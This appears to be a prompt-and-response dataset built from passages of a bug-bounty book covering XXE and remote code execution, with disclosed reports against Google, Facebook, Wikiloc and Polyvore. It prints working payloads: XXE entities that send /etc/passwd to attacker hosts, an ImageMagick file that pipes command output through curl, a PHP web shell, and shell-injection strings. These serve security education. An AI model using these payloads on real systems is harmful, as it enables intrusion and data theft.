example again, if we wanted every job\nto include a link to our website, it would be tedious for us to write the\naddress every time, especially if our URL could change. Instead, we\ncan use an entity, have the parser fetch the URL at the time of parsing,\nand insert the value into the document. To create one, you declare a\nplaceholder entity name in an !ENTITY tag along with the information\nto put in that placeholder. In the XML document, the entity name is\nprefixed with an ampersand (&) and ends with a semicolon (;). When\nthe XML document is accessed, the placeholder name is substituted\nwith the value declared in the tag. Entity names can do more than just\nreplace placeholders with strings: they can also fetch the contents of a\nwebsite or file using the SYSTEM tag along with a URL.\nWe can update our XML file to include this:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE Jobs [\n--snip--\n208\nDownload from www.finelybook.com 7450911@qq.com\n<!ATTLIST Responsibility fundamental CDATA \"0\">\n➊ <!ELEMENT Website ANY>\n➋ <!ENTITY url SYSTEM \"website.txt\">\n]>\n<Jobs>\n<Job>\n<Title>Hacker</Title>\n<Compensation>1000000</Compensation>\n<Responsibility fundamental=\"1\">Shot web</Responsibility>\n➌ <Website>&url;</Website>\n</Job>\n</Jobs>\nNotice that I’ve added a Website !ELEMENT, but instead of\n(#PCDATA), I’ve used ANY ➊. This data definition means the Website\ntag can contain any combination of parsable data. I’ve also defined an\n!ENTITY with a SYSTEM attribute, telling the parser to get the contents\nof the website.txt file wherever the placeholder name url is inside a\nwebsite tag ➋. At ➌ I use the website tag, and the contents of\nwebsite.txt would be fetched in the place of &url;. Note the & in front\nof the entity name. Whenever you reference an entity in an XML\ndocument, you must precede it with &.\nHOW XXE ATTACKS WORK\nIn an XXE attack, an attacker abuses a target application so that it\nincludes external entities in its XML parsing. In other words, the\napplication expects some XML but isn’t validating what it’s receiving;\nit just parses anything it gets. For instance, let’s say the job board in\nthe previous example lets you register and upload jobs via XML.\nThe job board might make its DTD file available to you and\nassume that you’ll submit a file matching the requirements. Instead of\n209\nDownload from www.finelybook.com 7450911@qq.com\nhaving the !ENTITY retrieve the contents of \"website.txt\", you could\nhave it retrieve the contents of \"/etc/passwd\". The XML would be\nparsed, and the contents of the server file /etc/passwd would be\nincluded in our content. (The /etc/passwd file originally stored all\nusernames and passwords on a Linux system. Although Linux systems\nnow store passwords in /etc/shadow, it’s still common to read the\n/etc/passwd file to prove that a vulnerability exists.)\nYou might submit something like this:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n➊ <!DOCTYPE foo [\n➋ <!ELEMENT foo ANY >\n➌ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]\n>\n➍ <foo>&xxe;</foo>\nThe parser receives this code and recognizes an internal DTD\ndefining a foo document type ➊. The DTD tells the parser that foo can\ninclude any parsable data ➋; then there’s an entity xxe that should\nread my /etc/passwd file (file:// denotes a full URI path to the\n/etc/passwd file) when the document is parsed. The parser should\nreplace &xxe; elements with those file contents ➌. Then, you finish it\noff with XML defining a <foo> tag that contains &xxe;, which prints\nmy server info ➍. And that, friends, is why XXE is so dangerous.\nBut wait, there’s more. What if the application didn’t print a\nresponse and only parsed my content? If the contents of the sensitive\nfile were never returned to me, would the vulnerability still be useful?\nWell, instead of parsing a local file, you could contact a malicious\nserver like so:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n210\nDownload from www.finelybook.com 7450911@qq.com\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n➊ <!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >\n➋ <!ENTITY callhome SYSTEM ➌\"www.malicious.com/?%xxe;\">\n]\n>\n<foo>&callhome;</foo>\nNow when the XML document is parsed, the callhome entity ➋ is\nreplaced by the contents of a call to www.<malicious>.com/?%xxe ➌.\nBut ➌ requires that %xxe be evaluated as defined in ➊. The XML\nparser reads /etc/passwd and appends that as the parameter to the URL\nwww.<malicous>.com/, thereby sending the file contents as a URL\nparameter ➌. Because you control that server, you would check your\nlog, and sure enough, it would have the contents of /etc/passwd.\nYou might have noticed the use of % instead of & in the callhome\nURL, %xxe; ➊. A % is used when the entity should be evaluated\nwithin the DTD definition. A & is used when the entity is evaluated in\nthe XML document.\nSites protect against XXE vulnerabilities by disabling external\nentities from being parsed. The OWASP XML External Entity\nPrevention Cheat Sheet (see\nhttps://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prev\nention_Cheat_Sheet) has instructions on how to do this for a variety of\nlanguages.\nREAD ACCESS TO GOOGLE\nDifficulty: Medium\nURL: https://google.com/gadgets/directory?synd=toolbar/\nSource: https://blog.detectify.com/2014/04/11/how-we-got-read-\n211"
  },
  {
    "input": "What is an XXE vulnerability and how can it be exploited to read internal files or make remote requests?",
    "summary": "The text discusses three examples of XXE (External Entity) vulnerabilities: one in Google Toolbar, another in Facebook, and a third in Wikiloc. In each case, attackers used XML file uploads to exploit weaknesses that allowed them to read sensitive files or make remote requests. The key takeaway is that XML files can be a security risk if not properly handled, and developers should always test for XXE vulnerabilities when accepting XML uploads. It also highlights that even if a remote call isn't successful, it can still prove the existence of an XXE vulnerability.",
    "output": "Download from www.finelybook.com 7450911@qq.com\naccess-on-googles-production-servers/\nDate reported: April 2014\nBounty paid: $10,000\nThis Google read access vulnerability exploited a feature of Google’s\nToolbar button gallery that allowed developers to define their own\nbuttons by uploading XML files containing metadata. Developers\ncould search the buttons gallery, and Google would show a\ndescription of the button in the search results.\nAccording to the Detectify team, when an XML file that referenced\nan entity to an external file was uploaded to the gallery, Google parsed\nthe file and then rendered the contents in the button search results.\nAs a result, the team used the XXE vulnerability to render the\ncontents of the server’s /etc/passwd file. At a minimum, this\ndemonstrated that malicious users could exploit the XXE vulnerability\nto read internal files.\nTakeaways\nEven big companies can make mistakes. Whenever a site accepts\nXML, no matter who owns the site, always test for XXE\nvulnerabilities. Reading an /etc/passwd file is a good way to\ndemonstrate a vulnerability’s impact on companies.\nFACEBOOK XXE WITH MICROSOFT\nWORD\nDifficulty: Hard\nURL: https://facebook.com/careers/\nSource: Attack Secure Blog\n212\nDownload from www.finelybook.com 7450911@qq.com\nDate reported: April 2014\nBounty paid: $6,300\nThis Facebook XXE is a little more challenging than the previous\nexample because it involves remotely calling a server. In late 2013,\nFacebook patched an XXE vulnerability discovered by Reginaldo\nSilva. Silva immediately reported the XXE to Facebook and asked for\npermission to escalate it to a remote code execution (a type of\nvulnerability covered in Chapter 12). He believed a remote code\nexecution was possible because he could read most files on the server\nand open arbitrary network connections. Facebook investigated and\nagreed, paying him $30,000.\nAs a result, Mohamed Ramadan challenged himself to hack\nFacebook in April 2014. He didn’t think another XXE was a\npossibility until he found Facebook’s careers page, which allowed\nusers to upload .docx files. The .docx file type is just an archive for\nXML files. Ramadan created a .docx file, opened it with 7-Zip to\nextract its contents, and inserted the following payload into one of the\nXML files:\n<!DOCTYPE root [\n➊ <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n➋ <!ENTITY % dtd SYSTEM \"http://197.37.102.90/ext.dtd\">\n➌ %dtd;\n➍ %send;\n]>\nIf the target has external entities enabled, the XML parser will\nevaluate the %dtd; ➌ entity, which makes a remote call to Ramadan’s\nserver http://197.37.102.90/ext.dtd ➋. That call would return the\nfollowing, which is the contents of the ext.dtd file:\n213\nDownload from www.finelybook.com 7450911@qq.com\n➎ <!ENTITY send SYSTEM 'http://197.37.102.90/FACEBOOK-HACKED?%file;'>\nFirst, %dtd; would reference the external ext.dtd file and make the\n%send; entity available ➎. Next, the parser would parse %send; ➍,\nwhich would make a remote call to http://197.37.102.90/FACEBOOK-\nHACKED?%file; ➎. The %file; references the /etc/passwd file ➊, so its\ncontents would replace %file; in the HTTP request ➎.\nCalling a remote IP to exploit an XXE isn’t always necessary,\nalthough it can be useful when sites parse remote DTD files but block\naccess to reading local files. This is similar to a server-side request\nforgery (SSRF), which was discussed in Chapter 10. With an SSRF, if\na site blocks access to internal addresses but allows calls to external\nsites and follows 301 redirects to internal addresses, you can achieve a\nsimilar result.\nNext, Ramadan started a local HTTP server on his server to receive\nthe call and content using Python and SimpleHTTPServer:\nLast login: Tue Jul 8 09:11:09 on console\n➊ Mohamed:~ mohaab007$ sudo python -m SimpleHTTPServer 80\nPassword:\n➋ Serving HTTP on 0.0.0.0 port 80...\n➌ 173.252.71.129 - - [08/Jul/2014 09:21:10] \"GET /ext.dtd HTTP/1.0\" 200 -\n173.252.71.129 - -[08/Jul/2014 09:21:11] \"GET /ext.dtd HTTP/1.0\" 200 -\n173.252.71.129 - - [08/Jul/2014 09:21:11] code 404, message File not found\n➍ 173.252.71.129 - -[08/Jul/2014 09:21:10] \"GET /FACEBOOK-HACKED? HTTP/1.0\"\n404\nAt ➊ is the command to start Python SimpleHTTPServer, which\nreturns the message \"Serving HTTP on 0.0.0.0 port 80...\" at ➋. The\nterminal waits until it receives an HTTP request to the server. At first,\nRamadan didn’t receive a response, but he waited until he finally got a\nremote call at ➌ to retrieve the /ext.dtd file. As expected, he then saw\n214\nDownload from www.finelybook.com 7450911@qq.com\nthe call back to the server /FACEBOOK-HACKED? ➍, but\nunfortunately without the contents of the /etc/passwd file appended.\nThis meant that either Ramadan couldn’t read local files using the\nvulnerability or that /etc/passwd didn’t exist.\nBefore I continue with this report, I should add that Ramadan\ncould have submitted a file that didn’t make a remote call to his server\nand instead could have just attempted to read the local file. But the\ninitial call for the remote DTD file demonstrates an XXE vulnerability\nif successful, whereas a failed attempt at reading a local file doesn’t.\nIn this case, because Ramadan recorded HTTP calls to his server from\nFacebook, he could prove Facebook was parsing remote XML entities\nand that a vulnerability existed even though he couldn’t access\n/etc/passwd.\nWhen Ramadan reported the bug, Facebook replied asking for a\nproof of concept video because they couldn’t replicate the upload.\nAfter Ramadan supplied a video, Facebook then rejected the\nsubmission and suggested that a recruiter had clicked a link, which\ninitiated the request to his server. After exchanging a few emails, the\nFacebook team did some more digging to confirm the vulnerability\nexisted and awarded a bounty. Unlike the initial XXE in 2013, the\nimpact of Ramadan’s XXE couldn’t have been escalated to a remote\ncode execution, so Facebook awarded a smaller bounty.\nTakeaways\nThere are a couple of takeaways here. XML files come in different\nshapes and sizes: keep an eye out for sites that accept .docx, .xlsx,\n.pptx, and other XML file types because there might be custom\napplications parsing the file’s XML. At first, Facebook thought an\nemployee clicked a malicious link that connected to Ramadan’s\n215\nDownload from www.finelybook.com 7450911@qq.com\nserver, which wouldn’t be considered an SSRF. But upon further\ninvestigation, Facebook confirmed the request was invoked through a\ndifferent method.\nAs you’ve seen in other examples, sometimes reports are initially\nrejected. It’s important to have confidence and to continue working\nwith the company you’re reporting to if you’re certain the\nvulnerability is valid. Don’t shy away from explaining why something\nmight be a vulnerability or more severe than the company’s initial\nassessment.\nWIKILOC XXE\nDifficulty: Hard\nURL: https://wikiloc.com/\nSource: https://www.davidsopas.com/wikiloc-xxe-vulnerability/\nDate reported: October 2015\nBounty paid: Swag\nWikiloc is a website for discovering and sharing the best outdoor trails\nfor hiking, cycling, and many other activities. It also lets users upload\ntheir own tracks via XML files, which turns out to be very enticing for\ncyclist hackers like David Sopas.\nSopas registered for Wikiloc and, after noticing the XML upload,\ndecided to test it for an XXE vulnerability. To start, he downloaded a\nfile from the site to determine Wikiloc’s XML structure, which in this\ncase was a .gpx file. He then modified the file and uploaded it. This is\nthe file with his modifications:\n{linenos=on}\n➊ <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://www.davidsopas.com/XXE\" > ]>\n216\nDownload from www.finelybook.com 7450911@qq.com\n<gpx\nversion=\"1.0\"\ncreator=\"GPSBabel - http://www.gpsbabel.org\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns=\"http://www.topografix.com/GPX/1/0\"\nxsi:schemaLocation=\"http://www.topografix.com/GPX/1/1 http://www.topografix\n.com/GPX/1/1/gpx.xsd\">\n<time>2015-10-29T12:53:09Z</time>\n<bounds minlat=\"40.734267000\" minlon=\"-8.265529000\" maxlat=\"40.881475000\"\nmaxlon=\"-8.037170000\"/>\n<trk>\n➋ <name>&xxe;</name>\n<trkseg>\n<trkpt lat=\"40.737758000\" lon=\"-8.093361000\">\n<ele>178.000000</ele>\n<time>2009-01-10T14:18:10Z</time>\n--snip--\nAt ➊, he added an external entity definition as the first line of the\nfile. At ➋, he called the entity from within the track name in the .gpx\nfile.\nUploading the file back to Wikiloc resulted in an HTTP GET request\nto Sopas’s server. This is notable for two reasons. First, by using a\nsimple proof of concept call, Sopas was able to confirm that the server\nwas evaluating his injected XML and the server would make external\ncalls. Second, Sopas used the existing XML document so his content\nfit within the structure the site was expecting.\nAfter Sopas had confirmed that Wikiloc would make external\nHTTP requests, the only other question was whether it would read\nlocal files. So, he modified his injected XML to have Wikiloc send\nhim its /etc/issue file contents (the /etc/issue file will will return the\noperating system used):\n<!DOCTYPE roottag [\n217\nDownload from www.finelybook.com 7450911@qq.com\n➊ <!ENTITY % file SYSTEM \"file:///etc/issue\">\n➋ <!ENTITY % dtd SYSTEM \"http://www.davidsopas.com/poc/xxe.dtd\">\n➌ %dtd;]>\n<gpx\nversion=\"1.0\"\ncreator=\"GPSBabel - http://www.gpsbabel.org\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns=\"http://www.topografix.com/GPX/1/0\"\nxsi:schemaLocation=\"http://www.topografix.com/GPX/1/1 http://www.topografix\n.com/GPX/1/1/gpx.xsd\">\n<time>2015-10-29T12:53:09Z</time>\n<bounds minlat=\"40.734267000\" minlon=\"-8.265529000\" maxlat=\"40.881475000\"\nmaxlon=\"-8.037170000\"/>\n<trk>\n➍ <name>&send;</name>\n--snip--\nThis code should look familiar. Here he has used two entities at ➊\nand ➋, which are defined using % because they’ll be evaluated in the\nDTD. At ➌, he retrieves the xxe.dtd file. The reference to &send; ➍ in\nthe tag gets defined by the returned xxe.dtd file he serves back to\nWikiloc from the remote call to his server ➋. Here’s the xxe.dtd file:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n➎ <!ENTITY % all \"<!ENTITY send SYSTEM 'http://www.davidsopas.com/XXE?\n%file;'>\">\n➏ %all;\nThe % all ➎ defines the entity send at ➍. Sopas’s execution is\nsimilar to Ramadan’s approach to Facebook but with a subtle\ndifference: Sopas attempted to ensure that all places the XXE could be\nexecuted were included. That is why he calls %dtd; ➌ right after\ndefining it in the internal DTD and %all; ➏ immediately after defining\nit in the external DTD. The executed code is on the backend of the\nsite, so you likely won’t know exactly how the vulnerability was\n218\nDownload from www.finelybook.com 7450911@qq.com\nexecuted. But here’s what the parsing process could have looked like:\n1. Wikiloc parses the XML and evaluates %dtd; as an external call to Sopas’s\nserver. Then Wikiloc requests the xxe.dtd file on Sopas’s server.\n2. Sopas’s server returns the xxe.dtd file to Wikiloc.\n3. Wikiloc parses the received DTD file, which triggers the call to %all.\n4. When %all is evaluated, it defines &send;, which includes a call on the\nentity %file.\n5. The %file; call in the URL value is replaced with the contents of the\n/etc/issue file.\n6. Wikiloc parses the XML document. This parses the &send; entity, which\nevaluates to a remote call to Sopas’s server with the contents of the\n/etc/issue file as a parameter in the URL.\nIn his own words, game over.\nTakeaways\nThis is a great example of how you can use a site’s XML templates to\nembed your own XML entities so the file is parsed by the target. In\nthis case, Wikiloc was expecting a .gpx file and Sopas kept that\nstructure, inserting his own XML entities within expected tags.\nAdditionally, it’s interesting to see how you can serve a malicious\nDTD file back to have a target make GET requests to your server with\nfile contents as URL parameters. This is an easy way to facilitate data\nextraction because the GET parameters will be logged on your server.\nSUMMARY\nAn XXE represents an attack vector with huge potential. You can\naccomplish an XXE attack in a few ways: getting a vulnerable\napplication to print its /etc/passwd file, calling to a remote server\n219\nDownload from www.finelybook.com 7450911@qq.com\nusing the /etc/passwd file’s contents, and calling for a remote DTD\nfile that instructs the parser to callback to a server with the /etc/passwd\nfile.\nKeep an eye out for file uploads, especially those that take some\nform of XML. You should always test them for XXE vulnerabilities.\n220"
  },
  {
    "input": "What are the common methods for exploiting remote code execution (RCE) vulnerabilities in web applications, and how can developers prevent them?",
    "summary": "Remote code execution (RCE) vulnerabilities occur when user input is not properly sanitized, allowing attackers to execute arbitrary commands. This can be done by chaining commands in shell functions or by exploiting functions that process user input without validation. RCE can lead to severe consequences, such as gaining server access, if the application's user permissions are high. Different methods, like using unpatched libraries or exploiting SSH configurations, can be used to achieve RCE, but they all rely on the application accepting unsanitized input.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n12\nREMOTE CODE EXECUTION\nA remote code execution (RCE) vulnerability occurs when an\napplication uses user-controlled input without sanitizing it. RCE is\ntypically exploited in one of two ways. The first is by executing shell\ncommands. The second is by executing functions in the programming\nlanguage that the vulnerable application uses or relies on.\nEXECUTING SHELL COMMANDS\nYou can perform RCE by executing shell commands that the\napplication doesn’t sanitize. A shell gives command line access to an\noperating system’s services. As an example, let’s pretend the site\nwww.<example>.com is designed to ping a remote server to confirm\nwhether the server is available. Users can trigger this by providing a\ndomain name to the domain parameter in www.example.com?domain=,\nwhich the site’s PHP code processes as follows:\n➊ $domain = $_GET[domain];\necho shell_exec(➋\"ping -c 1 $domain\");\n221\nDownload from www.finelybook.com 7450911@qq.com\nVisiting www.<example>.com?domain=google.com assigns the\nvalue google.com to the variable $domain at ➊ and then passes that\nvariable directly into the shell_exec function as an argument for the ping\ncommand at ➋. The shell_exec function executes a shell command and\nreturns the complete output as a string.\nThe output of this command is something like the following:\nPING google.com (216.58.195.238) 56(84) bytes of data.\n64 bytes from sfo03s06-in-f14.1e100.net (216.58.195.238): icmp_seq=1 ttl=56 time=1.51 ms\n--- google.com ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.519/1.519/1.519/0.000 ms\nThe details of the response aren’t important: just know that the\n$domain variable is passed directly to the shell_exec command without\nbeing sanitized. In bash, which is a popular shell, you can chain\ncommands together using a semicolon. So an attacker could visit the\nURL www.<example>.com?domain=google.com;id, and the shell_exec\nfunction would execute the ping and id commands. The id command\noutputs information about the current user executing the command on\nthe server. For example, the output might look like the following:\n➊ PING google.com (172.217.5.110) 56(84) bytes of data.\n64 bytes from sfo03s07-in-f14.1e100.net (172.217.5.110):\nicmp_seq=1 ttl=56 time=1.94 ms\n--- google.com ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.940/1.940/1.940/0.000 ms\n➋ uid=1000(yaworsk) gid=1000(yaworsk) groups=1000(yaworsk)\nThe server executes two commands, so the response from the ping\ncommand displays ➊ along with the output from the id command. The\nid command’s output ➋ indicates the website is running the\n222\nDownload from www.finelybook.com 7450911@qq.com\napplication on the server as the user named yaworsk with a uid of 1000\nthat belongs to the gid and group 1000 with the same name, yaworsk.\nThe user permissions of yaworsk determine how severe this RCE\nvulnerability is. In this example, an attacker could read the site’s code\nusing the command ;cat FILENAME (where FILENAME is the file to be\nread) and might write files to some directories. If the site uses a\ndatabase, it’s likely an attacker could dump that as well.\nThis type of RCE occurs if a site trusts user-controlled input\nwithout sanitizing it. The solution to addressing the vulnerability is\nsimple. In PHP, a website’s developer can use the escapeshellcmd,\nwhich escapes any characters in a string that might trick a shell into\nexecuting arbitrary commands. As a result, any appended commands\nin the URL parameter would be read as one escaped value. This\nmeans that google.com\\;id would have been passed to the ping command,\nresulting in the error ping: google.com;id: Name or service not known.\nAlthough the special characters would be escaped to avoid\nexecuting additional, arbitrary commands, keep in mind that\nescapeshellcmd would not prevent you from passing command line\nflags. A flag is an optional argument that changes a command’s\nbehavior. For example, -0 is a common flag used to define a file to\nwrite to when a command generates output. Passing a flag could\nchange the behavior of the command and possibly result in an RCE\nvulnerability. Preventing RCE vulnerabilities can be tricky because of\nthese nuances.\nEXECUTING FUNCTIONS\nYou can also perform RCE by executing functions. For example, if\nwww.<example>.com allowed users to create, view, and edit blog\n223\nDownload from www.finelybook.com 7450911@qq.com\nposts via a URL, like www.<example>.com?id=1&action=view, the\ncode that performed these actions might look like the following:\n➊ $action = $_GET['action'];\n$id = $_GET['id'];\n➋ call_user_func($action, $id);\nHere the website uses the PHP function call_user_func ➋, which\ncalls the first argument given as a function and passes the remaining\nparameters as arguments to that function. In this case, the application\nwould call the view function that is assigned to the action variable ➊\nand pass 1 to the function. This command would presumably show the\nfirst blog post.\nBut if a malicious user visits the URL www.<example>.com?\nid=/etc/passwd &action=file_get_contents, this code would evaluate\nas:\n$action = $_GET['action']; //file_get_contents\n$id = $_GET['id']; ///etc/passwd\ncall_user_func($action, $id); //file_get_contents(/etc/passwd);\nPassing file_get_contents as the action argument calls that PHP\nfunction to read the contents of a file into a string. In this case, the file\n/etc/passwd is passed as the id parameter. Then /etc/passwd is passed\nas the argument to file_get_contents, resulting in the file being read. An\nattacker could use this vulnerability to read the source code of the\nentire application, obtain database credentials, write files on the\nserver, and so on. Instead of showing the first blog post, the output\nwould look like this:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n224\nDownload from www.finelybook.com 7450911@qq.com\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nIf the functions passed to the action parameter are not sanitized or\nfiltered, it’s also possible for an attacker to invoke shell commands\nwith PHP functions, such as shell_exec, exec, system, and so on.\nSTRATEGIES FOR ESCALATING REMOTE\nCODE EXECUTION\nBoth types of RCE can cause a variety of effects. When an attacker\ncan execute any programming language function, it’s likely they\nmight escalate the vulnerability to execute shell commands. Executing\nshell commands is often more critical because an attacker could\ncompromise the entire server rather than just the application. The\nextent of the vulnerability depends on the server user’s permissions or\nwhether the attacker can exploit another bug to elevate the user’s\nprivileges, which is commonly referred to as local privilege escalation\n(LPE).\nAlthough a full explanation of LPEs is beyond the scope of this\nbook, just know that an LPE typically occurs by exploiting kernel\nvulnerabilities, services running as root, or set user ID (SUID)\nexecutables. A kernel is the computer’s operating system. Exploiting a\nkernel vulnerability could allow an attacker to elevate their\npermissions to perform actions they otherwise wouldn’t be authorized\nto do. In cases where the attacker can’t exploit the kernel, they could\ntry exploiting services running as root. Normally, services shouldn’t\nrun as root; this vulnerability often occurs when an administrator\nignores security considerations by starting a service as the root user. If\nthe administrator is compromised, the attacker could access the\n225\nDownload from www.finelybook.com 7450911@qq.com\nservice running as root, and any commands the service runs would\nhave elevated root permissions. Lastly, the attacker could exploit\nSUID, which allows users to execute a file with the permissions of a\nspecified user. Although this is meant to enhance security, when\nmisconfigured, it could allow attackers to execute commands with\nelevated privileges, similar to services running as root.\nGiven the variety of operating systems, server software,\nprogramming languages, frameworks, and so on used to host websites,\nit’s impossible to detail every way you could inject functions or shell\ncommands. But there are patterns to finding clues to where potential\nRCEs might exist without seeing the application code. In the first\nexample, one red flag was that the site executed the ping command,\nwhich is a system-level command.\nIn the second example, the action parameter is a red flag because it\nallowed you to control what function is run on the server. When\nyou’re looking for these types of clues, look at the parameters and\nvalues passed to the site. You can easily test this type of behavior by\npassing system actions or special command line characters, like\nsemicolons or backticks, to the parameters in place of expected values.\nAnother common cause of an application-level RCE is unrestricted\nfile uploads that the server executes when visited. For example, if a\nPHP website allows you to upload files to a workspace but doesn’t\nrestrict the file type, you could upload a PHP file and visit it. Because\na vulnerable server can’t differentiate between legitimate PHP files for\nthe application and your malicious upload, the file will be interpreted\nas PHP and its contents will be executed. Here’s an example of a file\nthat allows you to execute PHP functions defined by the URL\nparameter super_secret_web_param:\n226\nDownload from www.finelybook.com 7450911@qq.com\n$cmd = $_GET['super_secret_web_param'];\nsystem($cmd);\nIf you uploaded this file to www.<example>.com and accessed it at\nwww.<example>.com/files/shell.php, you could execute system\ncommands by adding the parameter with a function, such as ?\nsuper_secret_web_param='ls'. Doing so would output the contents of the\nfiles directory. Be extremely careful when you’re testing this type of\nvulnerability. Not all bounty programs want you to execute your own\ncode on their server. If you do upload a shell like this, be sure to\ndelete it so no one else finds it or exploits it maliciously.\nMore complex RCE examples are often the result of nuanced\napplication behavior or programming mistakes. In fact, such examples\nwere discussed in Chapter 8. Orange Tsai’s Uber Flask Jinja2\ntemplate injection (page 74) was an RCE that permitted him to\nexecute his own Python functions using the Flask templating\nlanguage. My Unikrn Smarty template injection (page 78) allowed me\nto exploit the Smarty framework to execute PHP functions, including\nfile_get_contents. Given the variety of RCEs, here we’ll focus on more\ntraditional examples than those you’ve seen in previous chapters.\nPOLYVORE IMAGEMAGICK\nDifficulty: Medium\nURL: Polyvore.com (Yahoo! acquisition)\nSource: http://nahamsec.com/exploiting-imagemagick-on-yahoo/\nDate reported: May 5, 2016\nBounty paid: $2,000\nLooking at vulnerabilities that have been disclosed in widely used\n227\nDownload from www.finelybook.com 7450911@qq.com\nsoftware libraries can be an effective way to discover bugs in sites\nusing that software. ImageMagick is a common graphics library that\nprocesses images and has an implementation in most, if not all, major\nprogramming languages. This means that an RCE in the ImageMagick\nlibrary can have devastating effects on websites that rely on it.\nIn April 2016, the maintainers of ImageMagick publicly disclosed\nlibrary updates to fix critical vulnerabilities. The updates revealed that\nImageMagick wasn’t properly sanitizing input in a variety of ways.\nThe most dangerous of these led to an RCE via ImageMagick’s\ndelegate functionality, which processes files using external libraries.\nThe following code does this by passing a user-controlled domain to\nthe system() command as the placeholder %M:\n\"wget\" -q -O \"%o\" \"https:%M\"\nThis value was not sanitized before it was used, so submitting\nhttps://example.com\";|ls \"-la would translate to this:\nwget -q -O \"%o\" \"https://example.com\";|ls \"-la\"\nAs in the earlier RCE example, which involved chaining extra\ncommands to ping, this code chains an extra command line function to\nthe intended functionality using a semicolon.\nThe delegate functionality can be abused by image file types that\nallow external file referencing. Examples include SVGs and the\nImageMagick-defined file type, MVG. When ImageMagick processes\nan image, it tries to guess a file’s type based on its file contents rather\nthan its extension. For example, if a developer tried to sanitize user-\nsubmitted images by allowing their application to accept only user\nfiles ending in .jpg, an attacker could bypass the sanitization by\nrenaming a .mvg file as a .jpg. The application would believe the file\n228\nDownload from www.finelybook.com 7450911@qq.com\nis a safe .jpg, but ImageMagick would properly recognize the file type\nwas an MVG based on the file content. This would allow the attacker\nto abuse the ImageMagick RCE vulnerability. Examples of malicious\nfiles used to abuse this ImageMagick vulnerability are available at\nhttps://imagetragick.com/.\nAfter this vulnerability was publicly disclosed and websites had an\nopportunity to update their code, Ben Sadeghipour went hunting for\nsites using unpatched versions of ImageMagick. As his first step,\nSadeghipour re-created the vulnerability on his own server to confirm\nhe had a working malicious file. He chose to use the example MVG\nfile from https://imagetragick.com/, but could have easily used the\nSVG file as well, since both reference external files which will trigger\nthe vulnerable ImageMagick delegate functionality. Here’s his code:\npush graphic-context\nviewbox 0 0 640 480\n➊ image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl\\\nhttp://SOMEIPADDRESS:8080/ -d @- > /dev/null`'\npop graphic-context\nThe important part of this file is the line at ➊, which includes the\nmalicious input. Let’s break it down. The first part of the exploit is\nhttps://127.0.0.1/x.php?x=. This is the remote URL ImageMagick is\nexpecting as part of its delegator behavior. Sadeghipour follows this\nwith `id. On the command line, backticks (`) denote input that the shell\nshould process before the main command. This ensures that\nSadeghipour’s payload (described next) is processed immediately.\nThe pipe (|) passes output from one command to the next. In this\ncase, the output of id is passed to curl http://SOMEIPADDRESS:8080/ -d @-.\nThe cURL library makes remote HTTP requests and, in this case,\nmakes a request to Sadeghipour’s IP address, which is listening on\n229\nDownload from www.finelybook.com 7450911@qq.com\nport 8080. The -d flag is a cURL option to send data as a POST request.\nThe @ instructs cURL to use the input exactly as it receives it with no\nother processing. The hyphen (–) denotes that standard input will be\nused. When all of this syntax is combined with the pipe (|), the output\nof the id command will be passed to cURL as the POST body without\nany processing. Finally, the > /dev/null code drops any output from the\ncommand so that nothing is printed to the vulnerable server terminal.\nThis helps keep the target from realizing that their security has been\ncompromised.\nBefore uploading the file, Sadeghipour started a server to listen for\nHTTP requests using Netcat, a common networking utility for reading\nand writing to connections. He ran the command nc -l -n -vv -p 8080,\nwhich allowed Sadeghipour to log POST requests to his server. The -l\nflag enables listen mode (to receive requests), -n prevents DNS\nlookups, -vv enables verbose logging, and -p 8080 defines the port used.\nSadeghipour tested his payload on the Yahoo! site Polyvore. After\nuploading his file on the site as an image, Sadeghipour received the\nfollowing POST request, which included the result of the id command\nexecuted on Polyvore servers in the body.\nConnect to [REDACTED] from (UNKNOWN) [REDACTED] 53406\nPOST / HTTP/1.1\nUser-Agent: [REDACTED]\nHost: [REDACTED]\nAccept: /\nContent-Length: [REDACTED]\nContent-Type: application/x-www-form-urlencoded\nuid=[REDACTED] gid=[REDACTED] groups=[REDACTED]\nThis request meant that Sadeghipour’s MVG file was successfully\nexecuted, causing the vulnerable website to execute the id command.\n230\nDownload from www.finelybook.com 7450911@qq.com\nTakeaways\nThere are two significant takeaways from Sadeghipour’s bug. First,\nbeing aware of disclosed vulnerabilities provides you with the\nopportunity to test new code, as mentioned in previous chapters. If\nyou’re testing large libraries, also ensure that the companies of the\nwebsites you’re testing are properly managing their security updates.\nSome programs will ask you not to report unpatched updates within a\ngiven time frame of the disclosure, but after that you’re free to report\nthe vulnerability. Second, reproducing vulnerabilities on your own\nservers is a great learning opportunity. It ensures that your payloads\nare functional when you attempt to implement them for a bug bounty.\nALGOLIA RCE ON\nFACEBOOKSEARCH.ALGOLIA.COM\nDifficulty: High\nURL: facebooksearch.algolia.com\nSource: https://hackerone.com/reports/134321/\nDate reported: April 25, 2016\nBounty paid: $500\nProper reconnaissance is an important part of hacking. On April 25,\n2016, Michiel Prins (a HackerOne co-founder) was doing recon on\nalgolia.com using the tool Gitrob. This tool takes an initial GitHub\nrepository, person, or organization as a seed and spiders all\nrepositories it can find from people connected to it. Within all the\nrepositories it finds, it will look for sensitive files based on keywords,\nsuch as password, secret, database, and so on.\nUsing Gitrob, Prins noticed that Algolia had publicly committed a\n231\nDownload from www.finelybook.com 